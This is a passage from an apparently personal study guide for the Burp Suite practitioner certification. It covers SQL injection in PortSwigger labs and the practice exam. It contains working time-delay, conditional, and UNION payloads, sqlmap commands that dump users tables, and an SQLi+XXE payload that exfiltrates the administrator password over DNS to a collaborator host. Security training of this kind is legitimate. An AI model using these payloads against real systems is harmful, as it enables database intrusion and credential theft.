<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Practice Exam PostgreSQL TimeDelay</h4><a id="user-content-practice-exam-postgresql-timedelay" class="anchor" aria-label="Permalink: Practice Exam PostgreSQL TimeDelay" href="#practice-exam-postgresql-timedelay"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the Burp Practice exam stage 2 the SQL injection is escaped not using single quote <code>'</code> but using a semicolon <code>;</code> and then URL encoding it as <code>%3B</code>.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="%3BSELECT+pg_sleep(7)--"><pre>%3BSELECT<span class="pl-k">+</span>pg_sleep(<span class="pl-c1">7</span>)<span class="pl-c"><span class="pl-c">--</span></span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/practice-exam-stage-2-timedelay-sqli.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/practice-exam-stage-2-timedelay-sqli.png" alt="practice exam stage-2 time delay sqli" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">With a Intruder CLUSTER bomb attack the password can be extracted in one single attack with two payload positions in the below payload.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content=";SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--"><pre>;<span class="pl-k">SELECT</span><span class="pl-k">+</span>CASE<span class="pl-k">+</span>WHEN<span class="pl-k">+</span>(username<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>administrator<span class="pl-pds">'</span></span><span class="pl-k">+</span><span class="pl-k">AND</span><span class="pl-k">+</span><span class="pl-c1">SUBSTRING</span>(password,<span class="pl-c1">1</span>,<span class="pl-c1">1</span>)<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>)<span class="pl-k">+</span>THEN<span class="pl-k">+</span>pg_sleep(<span class="pl-c1">7</span>)<span class="pl-k">+</span>ELSE<span class="pl-k">+</span>pg_sleep(<span class="pl-c1">0</span>)<span class="pl-k">+</span>END<span class="pl-k">+</span><span class="pl-k">FROM</span><span class="pl-k">+</span>users<span class="pl-c"><span class="pl-c">--</span></span></pre></div>
<blockquote>
<p dir="auto">Stage 3 of the Burp Practice exam admin portal require exploitation of an <a href="#ysoserial">insecure deserialization</a> cookie value.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Blind SQLi</h3><a id="user-content-blind-sqli" class="anchor" aria-label="Permalink: Blind SQLi" href="#blind-sqli"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie.  Below is combination of SQL injection and XXE payload to exploit the vulnerability and send administrator password as DNS request to the collaborator service.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/&quot;&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--"><pre>TrackingId<span class="pl-k">=</span>xxx<span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+EXTRACTVALUE(xmltype(<span class="pl-pds">'</span></span><span class="pl-k">&lt;</span>%3fxml<span class="pl-k">+</span>version%3d<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-k">+</span>encoding%3d<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span>%3f<span class="pl-k">&gt;&lt;</span>!DOCTYPE<span class="pl-k">+</span>root<span class="pl-k">+</span>[<span class="pl-k">+</span><span class="pl-k">&lt;</span>!ENTITY<span class="pl-k">+</span>%<span class="pl-c1">25</span><span class="pl-k">+</span>remote<span class="pl-k">+</span>SYSTEM<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">"</span>http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span><span class="pl-k">+</span>%25remote%3b]<span class="pl-k">&gt;</span><span class="pl-s"><span class="pl-pds">'</span>),<span class="pl-pds">'</span></span><span class="pl-k">/</span>l<span class="pl-s"><span class="pl-pds">'</span>)+FROM+dual--</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-SQL-injection-out-of-band-exfil.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-SQL-injection-out-of-band-exfil.png" alt="Blind SQL injection with out-of-band data exfil" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration" rel="nofollow">PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration</a></p>
<blockquote>
<p dir="auto">The SQL payload above can also be used to extract the Administrator password for the this <a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors" rel="nofollow">PortSwigger Lab: Blind SQL injection with conditional errors</a> challenge.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Blind SQLi no indication</h3><a id="user-content-blind-sqli-no-indication" class="anchor" aria-label="Permalink: Blind SQLi no indication" href="#blind-sqli-no-indication"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Placing a single quote at end of the <code>trackingid</code> cookie or search parameter <code>/search_advanced?searchTerm='</code> may give response <code>500 Internal Server Error</code>. Make an educated guess, by using below blind SQLi payload and combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//OASTIFY.COM/&quot;&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--"><pre>TrackingId<span class="pl-k">=</span>xxx<span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+EXTRACTVALUE(xmltype(<span class="pl-pds">'</span></span><span class="pl-k">&lt;</span>%3fxml<span class="pl-k">+</span>version%3d<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-k">+</span>encoding%3d<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span>%3f<span class="pl-k">&gt;&lt;</span>!DOCTYPE<span class="pl-k">+</span>root<span class="pl-k">+</span>[<span class="pl-k">+</span><span class="pl-k">&lt;</span>!ENTITY<span class="pl-k">+</span>%<span class="pl-c1">25</span><span class="pl-k">+</span>remote<span class="pl-k">+</span>SYSTEM<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">"</span>http%3a//OASTIFY.COM/<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span><span class="pl-k">+</span>%25remote%3b]<span class="pl-k">&gt;</span><span class="pl-s"><span class="pl-pds">'</span>),<span class="pl-pds">'</span></span><span class="pl-k">/</span>l<span class="pl-s"><span class="pl-pds">'</span>)+FROM+dual--</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sqli-XXE.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sqli-XXE.png" alt="SQLi XXE" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Additional SQLi payload with XML for reference with <code>||</code> the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type and do some obfuscating.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="'||(select extractvalue(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % fuzz SYSTEM &quot;http://OASTI'||'FY.COM/&quot;&gt;%fuzz;]&gt;'),'/l') from dual)||'"><pre class="notranslate"><code>'||(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % fuzz SYSTEM "http://OASTI'||'FY.COM/"&gt;%fuzz;]&gt;'),'/l') from dual)||'
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/burp/application-security-testing/oast" rel="nofollow">OAST - Out-of-band Application Security Testing</a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band" rel="nofollow">PortSwigger Lab: Blind SQL injection with out-of-band interaction</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Blind SQLi Conditional Response</h3><a id="user-content-blind-sqli-conditional-response" class="anchor" aria-label="Permalink: Blind SQLi Conditional Response" href="#blind-sqli-conditional-response"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">This blind SQL injection is <em><strong>identified</strong></em> by a small message difference in the responses. When sending a valid true SQL query the response contain <code>Welcome back</code> string in response. Invalid false SQL query statement do not contain the response conditional message.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="' AND '1'='1"><pre class="notranslate"><code>' AND '1'='1
</code></pre></div>
<blockquote>
<p dir="auto">False SQL statement to <em><strong>identify</strong></em> conditional message not in response.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="' AND '1'='2"><pre class="notranslate"><code>' AND '1'='2
</code></pre></div>
<blockquote>
<p dir="auto">Determine how many characters are in the password of the administrator user. To do this, change the SQL statement value to and in intruder <strong>Settings tab</strong>, at the "Grep - Match" section. Clear any existing entries in the list, and then add the value <code>Welcome back</code> to <em><strong>identify</strong></em> true condition.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a"><pre class="notranslate"><code>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a
</code></pre></div>
<blockquote>
<p dir="auto">Next step is to test the character at each position to determine its value. This involves a much larger number of requests.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a"><pre class="notranslate"><code>' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sqli-conditional-response.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sqli-conditional-response.png" alt="sqli conditional response" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Alternative use a <strong>CLUSTER Bomb</strong> attack and setting <strong>two</strong> payload positions, first one for the character position with a payload of numbers <code>1..20</code> and the second position, using alpha and number characters, this will iterate through each permutation of payload combinations.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cluster-bomb.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cluster-bomb.png" alt="CLUSTER bomb" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" rel="nofollow">PortSwigger Lab: Blind SQL injection with conditional responses</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Oracle</h3><a id="user-content-oracle" class="anchor" aria-label="Permalink: Oracle" href="#oracle"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Identified SQL injection by adding a <strong>single quote</strong> to the end of the <code>category</code> parameter value and observing response of <code>500 Internal Server Error</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Retrieve the list of tables in the Oracle database:</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+table_name,NULL+FROM+all_tables--"><pre class="notranslate"><code>'+UNION+SELECT+table_name,NULL+FROM+all_tables--
</code></pre></div>
<blockquote>
<p dir="auto">Oracle payload to retrieve the details of the columns in the table.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXX'--"><pre class="notranslate"><code>'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXX'--
</code></pre></div>
<blockquote>
<p dir="auto">Oracle payload to retrieve the usernames and passwords from Users_XXX table.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+USERNAME_XXX,+PASSWORD_XXX+FROM+USERS_XXX--"><pre class="notranslate"><code>'+UNION+SELECT+USERNAME_XXX,+PASSWORD_XXX+FROM+USERS_XXX--
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" rel="nofollow">PortSwigger Lab: SQL injection attack, listing the database contents on Oracle</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SQLMAP</h3><a id="user-content-sqlmap" class="anchor" aria-label="Permalink: SQLMAP" href="#sqlmap"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the <a href="https://portswigger.net/web-security/certification/takepracticeexam/index.html" rel="nofollow">PortSwigger Practice Exam APP</a> we <em><strong>identify</strong></em> SQLi on the advance search function by adding a single quote and the response result in <code>HTTP/2 500 Internal Server Error</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Here is my HackTheBox CPTS study notes on SQLMAP examples to bypass primitive protection WAF mechanisms. <a href="https://github.com/botesjuan/cpts-quick-references/blob/main/module/sqlmap%20Essentials.md#exercise-cases">SQLMAP Essentials - Cases</a></p>
</blockquote>
<blockquote>
<p dir="auto">After doing some testing with SQLMAP versions <code>1.7.2#stable</code> and <code>1.6</code>, I found that both are able to exploit the PortSwigger Practice exam. Walkthrough from <a href="https://youtu.be/yC0F05oggTE?t=563" rel="nofollow">bmdyy doing the Practice Exam using SQLMAP</a> for reference of the parameters used.</p>
</blockquote>
<p dir="auto"><a href="https://forum.portswigger.net/thread/stage-2-of-practice-exam-with-sqlmap-1-7-2-2078f927" rel="nofollow">PortSwigger Forum thread - SQLMAP</a></p>
<blockquote>
<p dir="auto">I took the practice exam and was able to exploit SQLi using below payload.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x&amp;sort-by=DATE&amp;writer=' \ 
  -H 'authority: 0afd007004402dacc1e7220100750051.web-security-academy.net' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: _lab=YesYesYesYes; session=YesYesYesYes' \
  -H 'referer: https://TARGET.net/filtered_search?SearchTerm=x&amp;sort-by=DATE&amp;writer=' \
  -H 'sec-ch-ua: &quot;Chromium&quot;;v=&quot;111&quot;, &quot;Not(A:Brand&quot;;v=&quot;8&quot;' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: &quot;Linux&quot;' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
  -p 'sort-by' -batch --flush-session --dbms postgresql --technique E --level 5"><pre class="notranslate"><code>sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x&amp;sort-by=DATE&amp;writer=' \ 
  -H 'authority: 0afd007004402dacc1e7220100750051.web-security-academy.net' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: _lab=YesYesYesYes; session=YesYesYesYes' \
  -H 'referer: https://TARGET.net/filtered_search?SearchTerm=x&amp;sort-by=DATE&amp;writer=' \
  -H 'sec-ch-ua: "Chromium";v="111", "Not(A:Brand";v="8"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
  -p 'sort-by' -batch --flush-session --dbms postgresql --technique E --level 5
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sqlmap-dump-table-data.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sqlmap-dump-table-data.png" alt="SQLMAP used to dump data from tables" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">This is also a good start with SQLMAP to <em><strong>identify</strong></em> and extract data from a sensitive error based time delay SQL injection in advance search filters on the exam.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="sqlmap -v -u 'https://TARGET.NET/search?term=x&amp;organizeby=DATE&amp;journalist=&amp;cachebust=1656138093.57' -p &quot;term&quot; --batch --cookie=&quot;_lab=YESYESYESYES; session=YESYESYESYES&quot; --random-agent --level=2 --risk=2"><pre class="notranslate"><code>sqlmap -v -u 'https://TARGET.NET/search?term=x&amp;organizeby=DATE&amp;journalist=&amp;cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/2023-03-21_18-20_1.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/2023-03-21_18-20_1.png" alt="sqlmap 1.7.2 stable" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">SQLMAP Help usage</a></p>
<blockquote>
<p dir="auto">SQLMAP DBS to get databases.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="-p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs"><pre class="notranslate"><code>-p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs
</code></pre></div>
<blockquote>
<p dir="auto">Use SQLMAP dump tables identified from <code>public</code> database.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables"><pre class="notranslate"><code>-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables
</code></pre></div>
<blockquote>
<p dir="auto">ContinueUse SQLMAP <code>E</code> Technique to get the <code>users</code> content.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump"><pre class="notranslate"><code>-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump
</code></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Non-Oracle Manual SQLi</h3><a id="user-content-non-oracle-manual-sqli" class="anchor" aria-label="Permalink: Non-Oracle Manual SQLi" href="#non-oracle-manual-sqli"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">SQL injection UNION attack, determining the <strong>number of columns</strong> returned by the query.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+NULL,NULL--"><pre><span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+NULL,NULL--</span></pre></div>
<blockquote>
<p dir="auto">Determined there is <strong>two</strong> columns returned. Finding a column containing <code>text</code>, to be used for reflecting information extracted.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+'fuzzer',NULL--"><pre><span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+<span class="pl-pds">'</span></span>fuzzer<span class="pl-s"><span class="pl-pds">'</span>,NULL--</span></pre></div>
<blockquote>
<p dir="auto">Next <em><strong>identifying</strong></em> a list of <strong>tables</strong> in the database.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--"><pre><span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</span></pre></div>
<blockquote>
<p dir="auto"><strong>OPTIONAL:</strong> Retrieve data from other tables, use code below payload to retrieve the contents of the <code>users</code> table.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+username,+password+FROM+users--"><pre><span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+username,+password+FROM+users--</span></pre></div>
<blockquote>
<p dir="auto">Retrieve the names of the <strong>columns</strong> in the <em><strong>users</strong></em> table.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--"><pre><span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=<span class="pl-pds">'</span></span>users_XXXX<span class="pl-s"><span class="pl-pds">'</span>--</span></pre></div>
<blockquote>
